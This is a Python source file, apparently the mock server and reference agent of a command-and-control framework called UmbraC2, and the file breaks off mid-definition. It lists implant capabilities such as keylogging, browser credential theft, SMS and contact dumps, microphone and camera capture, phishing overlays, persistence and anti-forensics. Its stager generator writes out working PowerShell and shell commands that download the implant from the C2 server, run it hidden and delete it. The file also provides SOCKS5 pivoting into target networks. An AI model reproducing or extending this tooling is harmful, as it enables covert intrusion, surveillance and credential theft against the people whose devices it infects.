#!/usr/bin/env python3
"""Development server + reference agent for UmbraC2.

This is a *test double*, not the team server: it implements enough of the
server side of umbra/v1 (handshake, check-in, task queue, operator RPC) to
exercise the operator console and the protocol without building Go.

It is also imported by the test-suite:

    python3 tools/mock_server.py --port 4002 --operator alice:<token>
"""

from __future__ import annotations

import argparse
import base64
import hashlib
import hmac
import ipaddress
import json
import os
import queue
import secrets
import socket
import ssl
import struct
import subprocess
import sys
import threading
import time
from typing import Any, Dict, List, Optional, Tuple

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
sys.path.insert(0, os.path.join(ROOT, "operator"))
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from umbra_cli import crypto, handshake, netio, peer, session, upk, wire, ws  # noqa: E402

import batch_transports  # noqa: E402
import module_runtime  # noqa: E402
import recon_runtime  # noqa: E402
import vpn_transport  # noqa: E402


# How long an agent stays online after its last check-in.  Mirrors
# store.OfflineGrace in the Go server.
OFFLINE_GRACE = 90

# The size of one upload task when an artifact is pushed to an agent.  A
# chunk travels inside a task batch, and the batch travels inside one frame,
# so the chunk stays well below the frame budget.
ARTIFACT_CHUNK = 256 * 1024

# The task kinds the reference agent can run.
#
# The agent advertises this list in its handshake, exactly like the Rust
# beacon does, so the server's capability check has something to work with:
# a task kind that is not in the list is refused the same way it would be
# refused against the real implant.
# The transports the framework knows.  The route of an agent names one of
# them; an unknown name is refused instead of being pushed to the beacon.
TRANSPORTS = ("tcp", "http", "dns", "ws", "smtp", "s3")

AGENT_CAPS = [
    "shell", "exec", "sysinfo", "recon", "pwd", "cwd", "ls", "tail", "hash",
    "download", "cat", "upload", "ps", "proc.kill", "sleep", "exit", "kill",
    "ping", "tunnel", "p2p", "bof", "ext", "inject", "creds", "token",
    "privesc", "persist", "unpersist", "persist.list", "persist.verify",
    "persist.migrate", "persist.health", "update", "registry", "screenshot",
    "clipboard", "keylog", "keylog.file", "triage", "find", "netinfo",
    "session.open", "session.input", "session.close", "vpn", "scan",
    "resolve", "env", "touch", "evade.report", "evade.posture",
    "evade.profile", "evade.shape", "evade.killswitch", "hygiene.memory",
    "hygiene.process", "host.guide", "wmi.exec", "smb.exec", "winrm.exec", "dcom.exec",
    # The window of the phone: the accessibility service is what gives the
    # operator the screen and a hand on it.
    "ui.screen", "ui.tap", "ui.text", "ui.scroll", "ui.global", "ui.events",
    "ldap.query", "ssh.exec",
    # The senses of the phone: the location, the networks around it, the
    # people and the words of it.
    "gps.locate", "wifi.dump", "bluetooth.scan", "contacts.dump",
    "sms.dump", "call.logs", "emulator.detect",
    # The watchers: the things that happen without the operator asking.
    "sms.watch", "clipboard.sniff",
    # The ears and the eyes of the phone, and the screen it shows.
    "media.mic", "media.camera", "live.screen", "ui.stream",
    # The false screen, the databases and the end of the engagement.
    "phish.overlay", "app.dump", "anti.forensic", "evade.suicide",
    # The reconnaissance of the profiles, the map of the domain and the
    # suggestions that follow from the findings.
    "recon.suggest", "domain.map",
    # The loaders of the module ecosystem and the crypto the scripts and
    # the webassembly modules use.
    "wasm", "script", "shellcode", "crypto",
    # The senses of the desktop: the window table, the clipboard, the
    # screen in motion, the saved networks, the browsers, the security
    # software, the USB keys and the memory of a process.
    "window.list", "clipboard.watch", "screen.stream", "wifi.profiles",
    "browser.creds", "av.survey", "usb.history", "proc.memory",
]

# The module ABI.
#
# A module is a blob and a manifest.  The manifest opens with a magic and
# carries the version of the dialect it is written in, the argument schema,
# the output schema and the capabilities the module needs from the host.
# The server refuses to push a module to a host that lacks one of them, and
# the implant refuses to run a module whose manifest it cannot read.
MODULE_MAGIC = "UMBRAMOD1"
MODULE_ABI = 1


def _substitute_output(args: Dict[str, Any], output: bytes) -> Dict[str, Any]:
    """Replace the {{output}} placeholder in the arguments of a stage."""
    text = output.decode("utf-8", "replace")[:65536]

    def walk(value: Any) -> Any:
        if isinstance(value, str):
            return value.replace("{{output}}", text)
        if isinstance(value, dict):
            return {k: walk(v) for k, v in value.items()}
        if isinstance(value, list):
            return [walk(v) for v in value]
        return value

    return {k: walk(v) for k, v in args.items()}


def _now() -> int:
    return int(time.time())


def _parse_deadline(value: Any) -> int:
    """Read the deadline of a task: a unix timestamp or an RFC 3339 time.

    An empty value means no deadline at all: the task is worth running
    whenever the host comes back.
    """
    if value is None:
        return 0
    if isinstance(value, bool):
        raise ValueError("the deadline must be a unix timestamp or an RFC 3339 time")
    if isinstance(value, (int, float)):
        return int(value)
    text = str(value).strip()
    if not text:
        return 0
    try:
        return int(text)
    except ValueError:
        pass
    try:
        import datetime

        stamp = datetime.datetime.fromisoformat(text.replace("Z", "+00:00"))
        if stamp.tzinfo is None:
            stamp = stamp.replace(tzinfo=datetime.timezone.utc)
        return int(stamp.timestamp())
    except ValueError:
        raise ValueError("the deadline %r is neither a unix timestamp nor an "
                         "RFC 3339 time" % text)


def _parse_timeout(value: Any) -> int:
    """Read the timeout of a task: a number of seconds or a duration.

    A timeout that is not positive means that the server's own timeout
    applies, exactly as it did before the operator could ask for one.
    """
    if value is None:
        return 0
    if isinstance(value, bool):
        raise ValueError("the timeout must be a number of seconds")
    if isinstance(value, (int, float)):
        return int(value)
    text = str(value).strip()
    if not text:
        return 0
    try:
        return int(text)
    except ValueError:
        pass
    units = {"s": 1, "m": 60, "h": 3600, "d": 86400}
    if len(text) > 1 and text[-1] in units:
        try:
            return int(float(text[:-1]) * units[text[-1]])
        except ValueError:
            pass
    raise ValueError("the timeout %r is neither a number of seconds nor a "
                     "duration" % text)


def _expand_scan_target(target: str, cap: int) -> List[str]:
    """Expand a scan target into the addresses the scan walks.

    The target is one IPv4 address or a CIDR block.  The expansion is done
    by hand and the number of addresses is capped, so a /8 cannot turn into
    sixteen million connect attempts.
    """
    try:
        if "/" in target:
            base, _, bits = target.partition("/")
            network = ipaddress.ip_network(f"{base}/{bits}", strict=False)
        else:
            network = ipaddress.ip_network(f"{target}/32", strict=False)
    except ValueError:
        return []
    start = int(network.network_address)
    end = int(network.broadcast_address)
    out: List[str] = []
    for value in range(start, end + 1):
        out.append(str(ipaddress.ip_address(value)))
        if len(out) >= cap:
            break
    return out


def _parse_scan_ports(spec: str) -> List[int]:
    """Parse a port list: "80", "80,443" or "8000-8100"."""
    out: List[int] = []
    for part in spec.split(","):
        part = part.strip()
        if not part:
            continue
        if "-" in part:
            low, _, high = part.partition("-")
            try:
                first, last = int(low), int(high)
            except ValueError:
                continue
            if last < first or last > 65535:
                continue
            out.extend(range(first, last + 1))
        else:
            try:
                port = int(part)
            except ValueError:
                continue
            if port > 65535:
                continue
            out.append(port)
    return out[:256]


def decode_psk(raw: str) -> bytes:
    """The agent key the operator wrote, as the bytes the protocol uses.

    The operator writes the key as hex -- the server prints it that way and
    the beacons read it that way -- so the hex is decoded here.  A value
    that is not hex is taken as it is, which is what a lab that puts raw
    bytes in the environment needs.  The two sides have to agree on this,
    or the server and the beacons do not share a key at all.
    """
    text = raw.strip()
    if not text:
        return b""
    if len(text) % 2 == 0 and all(c in "0123456789abcdefABCDEF" for c in text):
        decoded = bytes.fromhex(text)
        if len(decoded) >= 16:
            return decoded
    return text.encode()


def decode_psk_bytes(raw: bytes) -> bytes:
    """The same rule, for a key that is already bytes."""
    try:
        text = raw.decode("ascii")
    except (UnicodeDecodeError, AttributeError):
        return raw
    if not text or not text.isprintable():
        return raw
    return decode_psk(text)


def new_id(prefix: str) -> str:
    return f"{prefix}-{crypto.random_bytes(4).hex()}"


# ---------------------------------------------------------------------------
# the module ABI
#
# The manifest of a module is what the server verifies, what the operator
# reads and what the implant checks before it runs anything.  The helpers
# below build it in the three shapes it travels in: the catalogue view the
# operator sees, the search index and the wire form that goes into the task.
# ---------------------------------------------------------------------------
def _module_view(entry: Dict[str, Any]) -> Dict[str, Any]:
    """The catalogue view of a module."""
    schema = list(entry.get("args") or [])
    return {
        "name": entry["name"],
        "version": entry.get("version", ""),
        "os": entry.get("os", "windows"),
        "arch": entry.get("arch", "amd64"),
        "format": entry.get("format", "coff"),
        "sha256": entry.get("sha256", ""),
        "size": entry.get("size", 0),
        "description": entry.get("description", ""),
        "magic": entry.get("magic", MODULE_MAGIC),
        "abi": int(entry.get("abi", MODULE_ABI)),
        "caps": list(entry.get("caps") or []),
        "requires": list(entry.get("requires") or []),
        "args": [a.get("name", "") for a in schema],
        "schema": schema,
        "output": dict(entry.get("output") or {}),
    }


def _module_matches(entry: Dict[str, Any], needle: str) -> bool:
    """Whether a module matches a lower case search query."""
    fields = [
        entry.get("name", ""),
        entry.get("description", ""),
        entry.get("os", ""),
        entry.get("arch", ""),
        entry.get("format", ""),
        entry.get("version", ""),
    ]
    fields.extend(entry.get("caps") or [])
    fields.extend(entry.get("requires") or [])
    for field in fields:
        if needle in str(field).lower():
            return True
    for arg in entry.get("args") or []:
        if needle in f"{arg.get('name', '')} {arg.get('help', '')}".lower():
            return True
    return False


def _module_manifest(entry: Dict[str, Any]) -> Dict[str, Any]:
    """The manifest that travels with the module inside the task.

    The implant reads this one: it refuses a module whose manifest it cannot
    read, it refuses a module that needs a capability it does not have and it
    refuses arguments that do not fit the schema.
    """
    schema = list(entry.get("args") or [])
    args = []
    for arg in schema:
        item = {
            "name": arg.get("name", ""),
            "type": arg.get("type", "string"),
            "required": bool(arg.get("required")),
        }
        if arg.get("default"):
            item["default"] = arg["default"]
        if arg.get("help"):
            item["help"] = arg["help"]
        args.append(item)
    manifest = {
        "magic": entry.get("magic", MODULE_MAGIC),
        "abi": int(entry.get("abi", MODULE_ABI)),
        "name": entry["name"],
        "version": entry.get("version", ""),
        "description": entry.get("description", ""),
        "os": entry.get("os", "windows"),
        "arch": entry.get("arch", "amd64"),
        "format": entry.get("format", "coff"),
        "digest": "sha256:" + entry.get("sha256", ""),
        "caps": list(entry.get("caps") or []),
        "args": args,
        "output": dict(entry.get("output") or {}),
    }
    return manifest


def _argument_fits(kind: str, value: Any) -> bool:
    """Whether a value fits the declared type of an argument."""
    if kind == "string":
        return isinstance(value, str)
    if kind == "int":
        return isinstance(value, int) and not isinstance(value, bool)
    if kind == "bool":
        return isinstance(value, bool)
    if kind == "bytes":
        return isinstance(value, (bytes, bytearray))
    # An unknown kind is a module that says nothing about its argument: the
    # value is passed through unchanged.
    return True


def _module_arguments(manifest: Dict[str, Any], args: Dict[str, Any]) -> Dict[str, Any]:
    """Check the arguments of a module against its schema.

    A required argument that is missing stops the module, and a value of the
    wrong kind stops it too: a module that asks for a number and gets a word
    would fail in a way the operator cannot see.
    """
    out: Dict[str, Any] = {}
    for arg in manifest.get("args") or []:
        name = str(arg.get("name", ""))
        if not name:
            continue
        kind = str(arg.get("type", "string") or "string")
        if name in args:
            value = args[name]
            if not _argument_fits(kind, value):
                raise ValueError(
                    f"the argument {name} of the module is a {kind}")
            out[name] = value
            continue
        default = arg.get("default")
        if default not in (None, ""):
            out[name] = default
            continue
        if arg.get("required"):
            raise ValueError(f"the module needs the argument {name}")
    for name, value in args.items():
        out.setdefault(name, value)
    return out


def _render_stager(platform: str, transport: str, server: str, url: str,
                   digest: str, agent_id: str, mode: str, store_name: str,
                   store_base: str, args: Dict[str, Any]) -> Optional[str]:
    """Render a stager, the way the Go server renders it.

    The test double mirrors the shapes of the real stager: the download
    stager, the stager that pulls the beacon from the file store of the
    server, the offline stager that carries the beacon inside itself, and
    the shim that only proves the digest.  The environment it exports is
    the one the implant expects for that transport.
    """
    if platform not in ("windows", "linux", "macos"):
        return None
    if transport not in ("tcp", "http", "ws", "dns", "smtp", "s3"):
        return None
    if mode not in ("download", "store", "offline", "shim"):
        return None
    env = [
        f"UMBRA_SERVER={server}",
        f"UMBRA_TRANSPORT={transport}",
        f"UMBRA_SLEEP=5",
        f"UMBRA_JITTER=20",
    ]
    if agent_id:
        env.append(f"UMBRA_AGENT_ID={agent_id}")
    if transport == "http":
        env.append(f"UMBRA_HTTP_PATH={args.get('http_path', '/api/v1/beacon')}")
    if transport == "ws":
        env.append(f"UMBRA_WS_PATH={args.get('ws_path', '/api/v1/beacon')}")
    if transport == "dns":
        if args.get("dns_resolver"):
            env.append(f"UMBRA_DNS_RESOLVER={args['dns_resolver']}")
        if args.get("dns_domain"):
            env.append(f"UMBRA_DNS_DOMAIN={args['dns_domain']}")
    if transport == "smtp":
        if args.get("smtp_addr"):
            env.append(f"UMBRA_SMTP_ADDR={args['smtp_addr']}")
        if args.get("pop3_addr"):
            env.append(f"UMBRA_POP3_ADDR={args['pop3_addr']}")
    if transport == "s3":
        if args.get("s3_endpoint"):
            env.append(f"UMBRA_S3_ENDPOINT={args['s3_endpoint']}")
        if args.get("s3_region"):
            env.append(f"UMBRA_S3_REGION={args['s3_region']}")

    payload_url = url
    if mode == "store":
        if not store_name or not store_base:
            return None
        base = store_base.rstrip("/")
        if not base.startswith(("http://", "https://")):
            base = "http://" + base
        payload_url = f"{base}/api/v1/artifact/{store_name}"
    if mode == "shim":
        if not digest or not url:
            return None
    if mode in ("download", "shim") and not payload_url:
        return None

    windows = platform == "windows"
    if mode == "offline":
        blob = args.get("payload")
        if isinstance(blob, str):
            blob = blob.encode()
        if not blob:
            return None
        encoded = base64.b64encode(bytes(blob)).decode()
        if windows:
            script = ("$ErrorActionPreference='Stop';"
                      f"$b='{encoded}';"
                      "$t=[IO.Path]::GetTempFileName();"
                      "[IO.File]::WriteAllBytes($t,[Convert]::FromBase64String($b));")
        else:
            script = ("set -e;"
                      f"b='{encoded}';"
                      "t=$(mktemp);"
                      "printf '%s' \"$b\" | base64 -d > \"$t\";")
    elif windows:
        script = ("$ErrorActionPreference='Stop';"
                  f"$u='{payload_url}';"
                  "$t=[IO.Path]::GetTempFileName();"
                  "Invoke-WebRequest -Uri $u -OutFile $t;")
    else:
        script = ("set -e;"
                  f"u='{payload_url}';"
                  "t=$(mktemp);"
                  "curl -fsSL \"$u\" -o \"$t\";")
    if digest:
        if windows:
            script += (f"$h='{digest.lower()}';"
                       "if((Get-FileHash -Algorithm SHA256 $t).Hash.ToLower() "
                       "-ne $h){Remove-Item $t;throw 'umbra: digest mismatch'};")
        else:
            script += (f"echo '{digest.lower()}  \"$t\"' "
                       "| sha256sum -c - >/dev/null;")
    if mode == "shim":
        # The shim only proves the digest and hands the path over.
        script += "Write-Output $t;" if windows else "printf '%s' \"$t\";"
        return script
    if windows:
        for item in env:
            script += f"$env:{item};"
        script += ("Start-Process -FilePath $t -ArgumentList '-server',"
                   "'$env:UMBRA_SERVER' -WindowStyle Hidden;")
        script += "Remove-Item $t -ErrorAction SilentlyContinue;"
    else:
        script += "chmod +x \"$t\";"
        for item in env:
            script += f"export {item};"
        script += "\"$t\" >/dev/null 2>&1 &"
        script += "rm -f \"$t\";"
    return script


def _module_key(values: Dict[str, Any]) -> bytes:
    """The key a module decrypts with, read from its arguments."""
    raw = values.get("key")
    if not isinstance(raw, str):
        return b""
    try:
        return bytes.fromhex(raw.strip())
    except ValueError:
        return b""


def _run_wasm(data: bytes, values: Dict[str, Any], caps: List[str],
              name: str) -> Tuple[int, bytes, str, Dict[str, Any]]:
    """Run a webassembly module in memory.

    The interpreter is the twin of the one in the implant: the same subset,
    the same host API and the same refusals.
    """
    try:
        code, out = module_runtime.run_wasm(data, list(caps), _module_key(values))
    except module_runtime.ModuleError as exc:
        return 1, b"", str(exc), {}
    return 0, out, "", {
        "module": name,
        "format": "wasm",
        "code": code,
    }


def _run_script(data: bytes, values: Dict[str, Any], caps: List[str],
                name: str) -> Tuple[int, bytes, str, Dict[str, Any]]:
    """Run a script module in memory.

    The dialect is the twin of the one in the implant: the same grammar,
    the same host API and the same refusals.
    """
    source = data.decode("utf-8", "replace")
    arguments = {str(key): str(value) for key, value in values.items()}
    try:
        code, out = module_runtime.run_script(source, list(caps), arguments)
    except module_runtime._ScriptError as exc:
        return 1, b"", str(exc), {}
    return 0, out, "", {
        "module": name,
        "format": "script",
        "code": code,
    }


# ---------------------------------------------------------------------------
# pivoting
#
# The test double implements the same callback protocol as the Go server:
# the agent dials back, announces the session id in the HELLO metadata and
# then serves logical streams.
# ---------------------------------------------------------------------------
def socks5_connect(conn: socket.socket, user: str = "", password: str = "") -> Tuple[Optional[str], int]:
    """Read a SOCKS5 CONNECT request.

    Returns ``(host, port)`` or ``(None, 0)`` when the client did not ask
    for a plain TCP connection.  Only the CONNECT command is supported,
    exactly like the Go implementation; the username and password method
    (RFC 1929) is used when the operator configured credentials.
    """
    try:
        head = conn.recv(2)
        if len(head) < 2:
            return None, 0
        conn.recv(head[1])  # the offered authentication methods
        if user:
            # The proxy asks for a user and a password.
            conn.sendall(b"\x05\x02")
            version = conn.recv(1)
            if not version or version[0] != 0x01:
                return None, 0
            name_len = conn.recv(1)
            if not name_len:
                return None, 0
            name = conn.recv(name_len[0])
            pass_len = conn.recv(1)
            if not pass_len:
                return None, 0
            secret = conn.recv(pass_len[0])
            if name.decode("utf-8", "replace") != user or secret.decode("utf-8", "replace") != password:
                conn.sendall(b"\x01\x01")
                return None, 0
            conn.sendall(b"\x01\x00")
        else:
            conn.sendall(b"\x05\x00")  # "no authentication required"
        request = conn.recv(4)
        if len(request) < 4 or request[1] != 0x01:
            conn.sendall(b"\x05\x07\x00\x01" + b"\x00" * 6)
            return None, 0
        atyp = request[3]
        if atyp == 0x01:
            host = socket.inet_ntoa(conn.recv(4))
        elif atyp == 0x04:
            # An IPv6 address: sixteen bytes, the way the protocol says.
            host = socket.inet_ntop(socket.AF_INET6, conn.recv(16))
        elif atyp == 0x03:
            length = conn.recv(1)
            if not length:
                return None, 0
            host = conn.recv(length[0]).decode("ascii", "replace")
        else:
            conn.sendall(b"\x05\x08\x00\x01" + b"\x00" * 6)
            return None, 0
        raw_port = conn.recv(2)
        if len(raw_port) < 2:
            return None, 0
        # The success answer is not sent here: the caller sends it when
        # the target is really reachable, and refuses it when the target
        # is on the deny list.
        return host, int.from_bytes(raw_port, "big")
    except OSError:
        return None, 0


def _peer_name(conn: Optional[socket.socket]) -> str:
    """The name of the client of a connection.

    A socket of the file system has a path, not an address and a port.
    """
    if conn is None:
        return ""
    try:
        name = conn.getpeername()
    except OSError:
        return ""
    if isinstance(name, tuple):
        return str(name[0]) if name else ""
    return str(name)


def _local_name(conn: Optional[socket.socket]) -> str:
    """The name of the local end of a connection."""
    if conn is None:
        return ""
    try:
        name = conn.getsockname()
    except OSError:
        return ""
    if isinstance(name, tuple):
        return str(name[0]) if name else ""
    return str(name)


def _socks5_reply(rep: int, bind_host: str) -> bytes:
    """The SOCKS5 answer: the code and the address of the listener.

    The family of the listener is kept: a proxy that listens on the IPv6
    loopback answers with an IPv6 address, so a client on an IPv6-only
    network is not told about an address it cannot use.
    """
    try:
        socket.inet_pton(socket.AF_INET6, bind_host)
        return bytes([0x05, rep, 0x00, 0x04]) + socket.inet_pton(socket.AF_INET6, bind_host) + b"\x00\x00"
    except OSError:
        pass
    return bytes([0x05, rep, 0x00, 0x01]) + b"\x00" * 4 + b"\x00\x00"


def _is_ip(host: str) -> bool:
    """Whether a target is an address and not a name."""
    try:
        socket.inet_aton(host)
        return True
    except OSError:
        pass
    try:
        socket.inet_pton(socket.AF_INET6, host)
        return True
    except OSError:
        return False


def _denied(rules: List[str], host: str, port: int) -> bool:
    """Whether the proxy refuses a target.

    A rule is "host" or "host:port"; a rule without a port refuses every
    port of the host.
    """
    if not host:
        return False
    name = host.lower()
    for rule in rules:
        rule = str(rule).strip().lower()
        if not rule:
            continue
        want, _, want_port = rule.partition(":")
        if want_port:
            try:
                if int(want_port) != port:
                    continue
            except ValueError:
                pass
        if want == name:
            return True
    return False


class TunnelStream:
    """One logical stream inside a tunnel session."""

    def __init__(self, stream_id: str) -> None:
        self.id = stream_id
        # The answer to the open request: None means "connected".
        self.result: "queue.Queue[Optional[str]]" = queue.Queue(maxsize=1)
        self.data: "queue.Queue[bytes]" = queue.Queue(maxsize=64)
        self.closed = threading.Event()
        # The session this stream belongs to: it is what carries the
        # bytes.  A stream of a peer link carries them on the peer
        # session instead.
        self.session: Any = None
        # The bytes that were read but not asked for: a read must return
        # exactly what the caller wanted, and a chunk can be larger.
        self._buf = bytearray()
        self._buf_lock = threading.Lock()

    # -- the bytes -------------------------------------------------------
    def write(self, data: bytes) -> int:
        """Send bytes over this stream."""
        if not data:
            return 0
        self.session.send(wire.MsgType.TUNNEL_DATA, {"stream": self.id, "data": data})
        return len(data)

    def read(self, count: int) -> bytes:
        """Read exactly ``count`` bytes; an empty result means the end."""
        with self._buf_lock:
            while len(self._buf) < count:
                try:
                    chunk = self.data.get(timeout=0.2)
                except queue.Empty:
                    if self.closed.is_set():
                        return b""
                    continue
                if not chunk:
                    return b""
                self._buf += chunk
            out = bytes(self._buf[:count])
            del self._buf[:count]
            return out


class TunnelSession:
    """One agent callback connection.

    The server drives the session: it asks the agent to open a connection to
    a target and relays the bytes over the callback.
    """

    def __init__(
        self,
        server: "MockServer",
        agent_id: str,
        sid: str,
        stream: netio.Stream,
        sess: session.Session,
    ) -> None:
        self.server = server
        self.agent_id = agent_id
        self.sid = sid
        self.stream = stream
        self.sess = sess
        # "callback" is the session the server opened to this agent;
        # "peer" is the link another beacon (or the server) dialled in.
        self.kind = "callback"
        self.gate = netio.SendGate(sess, stream)
        self.streams: Dict[str, TunnelStream] = {}
        self.lock = threading.Lock()
        self.ready = threading.Event()
        self.done = threading.Event()

    def send(self, msg_type: int, body: Dict[str, Any]) -> None:
        self.gate.send(msg_type, body)

    def read_loop(self) -> None:
        try:
            while not self.server._stop.is_set():
                msg_type, body = self.sess.decrypt_message(self.stream.recv_frame())
                if msg_type == wire.MsgType.TUNNEL_OPEN:
                    self._on_open(body)
                elif msg_type == wire.MsgType.TUNNEL_DATA:
                    self._on_data(body)
                elif msg_type == wire.MsgType.TUNNEL_CLOSE:
                    self._on_close(body)
        except Exception:
            pass
        finally:
            self.close()

    def _on_open(self, body: Dict[str, Any]) -> None:
        op = str(body.get("op", ""))
        sid = str(body.get("stream", ""))
        if op == "ready":
            self.ready.set()
            return
        if op != "result":
            return
        with self.lock:
            st = self.streams.get(sid)
        if st is None:
            return
        ok = bool(body.get("ok"))
        err = str(body.get("err", ""))
        st.result.put(None if ok else (err or "the agent refused the stream"))

    def _on_data(self, body: Dict[str, Any]) -> None:
        sid = str(body.get("stream", ""))
        data = body.get("data") or b""
        with self.lock:
            st = self.streams.get(sid)
        if st is None:
            return
        try:
            st.data.put_nowait(bytes(data))
        except queue.Full:
            st.closed.set()

    def _on_close(self, body: Dict[str, Any]) -> None:
        sid = str(body.get("stream", ""))
        with self.lock:
            st = self.streams.get(sid)
        if st is not None:
            st.closed.set()

    def open_stream(self, host: str, port: int, timeout: float = 20.0) -> TunnelStream:
        """Ask the agent to connect to ``host:port`` and wait for the answer."""
        sid = new_id("s")
        st = TunnelStream(sid)
        st.session = self
        with self.lock:
            self.streams[sid] = st
        self.send(
            wire.MsgType.TUNNEL_OPEN,
            {"stream": sid, "op": "open", "host": host, "port": int(port)},
        )
        try:
            err = st.result.get(timeout=timeout)
        except queue.Empty:
            err = "the agent did not answer the stream request"
        if err:
            with self.lock:
                self.streams.pop(sid, None)
            raise RuntimeError(err)
        return st

    def close(self) -> None:
        if self.done.is_set():
            return
        self.done.set()
        with self.lock:
            streams = list(self.streams.values())
            self.streams.clear()
        for st in streams:
            st.closed.set()
        with self.server._lock:
            if self.server.tunnel_sessions.get(self.agent_id) is self:
                del self.server.tunnel_sessions[self.agent_id]
        if self.kind == "peer":
            self.server.emit("pivot.peer_closed", self.agent_id,
                             data={"session": self.sid})
        else:
            self.server.emit("pivot.session_closed", self.agent_id,
                             data={"session": self.sid})


# ---------------------------------------------------------------------------
# server
# ---------------------------------------------------------------------------
def _peek_first(conn: socket.socket, count: int) -> Tuple[bytes, bytes]:
    """Look at the first bytes of a connection.

    A plain socket peeks at itself and gives nothing away.  A TLS socket
    cannot: OpenSSL refuses the peek flag, so the bytes are read and
    handed back to the caller, which puts them in front of the stream.
    """
    if not isinstance(conn, ssl.SSLSocket):
        try:
            return conn.recv(count, socket.MSG_PEEK), b""
        except OSError:
            return b"", b""
    buf = bytearray()
    try:
        while len(buf) < count:
            chunk = conn.recv(count - len(buf))
            if not chunk:
                break
            buf += chunk
    except OSError:
        return b"", b""
    # The bytes were taken off the socket, so they are handed back: the
    # caller puts them in front of whatever reads the connection next.
    return bytes(buf), bytes(buf)


class MockServer:
    """Minimal threaded umbra/v1 server used for tests and local development."""

    def __init__(
        self,
        agent_psk: bytes,
        operators: Dict[str, bytes],
        host: str = "127.0.0.1",
        port: int = 0,
        rekey_after: Optional[int] = None,
        roles: Optional[Dict[str, str]] = None,
        tls_cert: str = "",
        tls_key: str = "",
        tls_client_ca: str = "",
        tls_client_cn: str = "",
        tls_client_spki: str = "",
        websocket: bool = False,
        alerts: Optional[List[Dict[str, Any]]] = None,
        pivot_deny: Optional[List[str]] = None,
        agent_keys: Optional[Dict[str, bytes]] = None,
    ) -> None:
        self.agent_psk = decode_psk_bytes(agent_psk)
        # The keys that are bound to one agent id: a beacon that proves
        # such a key may not claim another name.
        self.agent_keys = dict(agent_keys or {})
        self.operators = dict(operators)
        # Roles mirror server/internal/rbac: everything defaults to admin so
        # existing tests keep working, and `roles=` narrows a specific console.
        self.roles = {name: (roles or {}).get(name, "admin") for name in self.operators}
        # The runtime keyring, mirrored from server/internal/keyring: the
        # previous credential keeps working for the overlap after a rotation,
        # so a console that was closed is not locked out.
        self.previous_agent_psk: Optional[bytes] = None
        self.previous_agent_until = 0.0
        self.previous_operators: Dict[str, tuple] = {}
        self.token_scopes: Dict[str, List[str]] = {}
        self.token_expires: Dict[str, float] = {}
        self.token_last_used: Dict[str, float] = {}
        self.token_rotated: Dict[str, float] = {}
        self.key_overlap = 1800.0
        # Test hook: force a key rotation once a session has sent this many
        # frames in either direction (real servers use REKEY_AFTER).
        self.rekey_after = rekey_after
        self.host = host
        self.port = port
        # The mutual TLS listener of the Go server, mirrored here so the
        # operator console can be tested against a real certificate.
        self.tls_cert = tls_cert
        self.tls_key = tls_key
        self.tls_client_ca = tls_client_ca
        # The pins on the client certificate, mirrored from
        # server/internal/mtls: the name it has to carry and the public key
        # it has to hold.  A certificate that is signed by the client CA
        # but carries another key is refused.
        self.tls_client_cn = tls_client_cn
        self.tls_client_spki = [
            part.strip().lower()
            for part in tls_client_spki.split(",")
            if part.strip()
        ]
        self._tls_ctx: Optional[ssl.SSLContext] = None
        # The WebSocket transport: the same protocol, but every frame travels
        # in a binary WebSocket frame.
        self.websocket = websocket
        self._sock: Optional[socket.socket] = None
        # The batch transports have listeners of their own: the mail
        # transport needs an SMTP and a POP3 port, the object transport
        # needs an HTTP port.
        self._mail_sock: Optional[socket.socket] = None
        self._pop3_sock: Optional[socket.socket] = None
        self._s3_sock: Optional[socket.socket] = None
        self.mail_addr = ""
        self.pop3_addr = ""
        self.s3_addr = ""
        # The mailbox of every agent of the mail transport.
        self.mailboxes: Dict[str, List[bytes]] = {}
        # The objects of the buckets of the object transport.
        self.objects: Dict[str, Dict[str, bytes]] = {}
        # The sessions of the agents that talk a batch transport: they have
        # no connection to keep the session in.
        self.batch_sessions: Dict[str, Dict[str, Any]] = {}
        self._stop = threading.Event()
        self._threads: List[threading.Thread] = []
        self._lock = threading.Lock()
        self.agents: Dict[str, Dict[str, Any]] = {}
        self.tasks: Dict[str, Dict[str, Any]] = {}
        # The multi-stage tasks that are still running, and the alert rules
        # the server watches the event stream with.
        self.chains: Dict[str, Dict[str, Any]] = {}
        self.alerts: List[Dict[str, Any]] = list(alerts or [])
        # The workflow layer: named sequences of steps and the runs that
        # came out of them.
        self.workflows: Dict[str, Dict[str, Any]] = {}
        self.workflow_runs: Dict[str, Dict[str, Any]] = {}
        self._workflow_seq = 0
        # The queue: the quiet window, the breakers of the hosts and the
        # tasks that keep failing.
        self.quiet = False
        self.delivery_log: List[List[str]] = []
        self.quiet_until = 0
        self.breakers: Dict[str, int] = {}
        # The journal of the recent events: a console that was not
        # watching asks for the ones it missed.
        self.events: List[Dict[str, Any]] = []
        self._event_seq = 0
        # The interactive sessions that are open, per agent.
        self.open_sessions: Dict[str, Dict[str, Any]] = {}
        # Mirrors the Go server's audit trail: one entry per operator RPC.
        self.audit_entries: List[Dict[str, Any]] = []
        self.chat: List[Dict[str, Any]] = []
        self.schedules: Dict[str, Dict[str, Any]] = {}
        # Named subscriber queues, so a directed event can be addressed to one
        # console (the Go hub filters on the operator name the same way).
        self.subscribers: List[Tuple[str, "queue.Queue[Dict[str, Any]]"]] = []
        # Presence per operator identity: which agent they are looking at and
        # when they last did anything.
        self.op_sessions: Dict[str, Dict[str, Any]] = {}
        # task ids cancelled after delivery; the next check-in carries one
        # TASK_CANCEL frame each, before TASK_BATCH (same order as the server).
        self.pending_cancels: Dict[str, List[str]] = {}
        # Callback sessions: agent id -> session.  A session is opened by the
        # agent (it dials back), the server only asks for one.
        self.tunnel_sessions: Dict[str, TunnelSession] = {}
        self.pending_tunnels: Dict[str, Tuple[str, threading.Event]] = {}
        # Open pivots: tunnel id -> description.
        self.pivots: Dict[str, Dict[str, Any]] = {}
        # The claims of the engagement, the clients of the proxy and the
        # log of the connections: the same three things the Go server keeps.
        self.pivot_claims: Dict[str, List[str]] = {}
        self.pivot_clients: Dict[str, Dict[str, Any]] = {}
        self.pivot_connections: List[Dict[str, Any]] = []
        # The targets the proxy refuses, the same list the Go server reads
        # from "pivot_deny" in the configuration.
        self.pivot_deny: List[str] = list(pivot_deny or [])
        # The layer-3 tunnel: agent id -> peer record.
        self.vpn_peers: Dict[str, Dict[str, Any]] = {}
        # The layer-3 tunnel: the same handshake and the same keys as the
        # Go server and the Rust beacon.
        self.vpn = vpn_transport.VpnServer(
            "10.77.0.0/24",
